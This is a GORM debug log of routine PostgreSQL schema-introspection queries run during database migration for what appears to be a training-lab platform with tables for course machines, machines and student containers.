2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.050ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.121ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.693ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[7.734ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'title') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.521ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'description') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.013ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'point') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.079ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'difficulty_level_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.827ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND constraint_name = 'fk_course_machines_difficulty_level'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.766ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'course_machines' AND indexname = 'idx_course_machines_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.582ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'operating_system_types' AND table_type = 'BASE TABLE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.349ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.218ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'operating_system_types'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.532ms] [34;1m[rows:-][0m SELECT * FROM "operating_system_types" LIMIT 5

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[10.934ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'operating_system_types' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[8.744ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'operating_system_types'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.527ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'operating_system_types'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.080ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'operating_system_types' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'operating_system_types' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.133ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'operating_system_types' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'operating_system_types' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.083ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'operating_system_types' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'operating_system_types' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.053ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'operating_system_types' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'operating_system_types' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.115ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'operating_system_types' AND column_name = 'type') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'operating_system_types' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.800ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'operating_system_types' AND indexname = 'idx_operating_system_types_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.659ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND table_type = 'BASE TABLE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.352ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.839ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'machines'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.805ms] [34;1m[rows:-][0m SELECT * FROM "machines" LIMIT 5

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[10.167ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'machines' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[16.605ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'machines'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.591ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'machines'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.225ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.446ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.134ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.487ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.356ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND column_name = 'image_name_or_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.109ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND column_name = 'room_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.587ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND column_name = 'course_machine_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.369ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND column_name = 'operating_system_type_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.427ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND constraint_name = 'fk_machines_room'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.959ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND constraint_name = 'fk_machines_course_machine'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.822ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND constraint_name = 'fk_machines_operating_system_type'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.834ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'machines' AND indexname = 'idx_machines_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.618ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machine_students' AND table_type = 'BASE TABLE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.361ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.546ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'machine_students'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.865ms] [34;1m[rows:-][0m SELECT * FROM "machine_students" LIMIT 5

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[15.018ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'machine_students' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[13.906ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'machine_students'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.570ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'machine_students'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.576ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machine_students' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machine_students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.090ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machine_students' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machine_students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.450ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machine_students' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machine_students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.469ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machine_students' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machine_students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.441ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machine_students' AND column_name = 'container_name_or_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machine_students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.072ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machine_students' AND column_name = 'done') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machine_students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.677ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machine_students' AND column_name = 'student_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machine_students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.317ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machine_students' AND column_name = 'machine_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machine_students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.071ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machine_students' AND constraint_name = 'fk_machine_students_student'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.766ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machine_students' AND constraint_name = 'fk_machine_students_machine'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.837ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'machine_students' AND indexname = 'idx_machine_students_deleted_at' AND schemaname = CURRENT_SCHEMA()

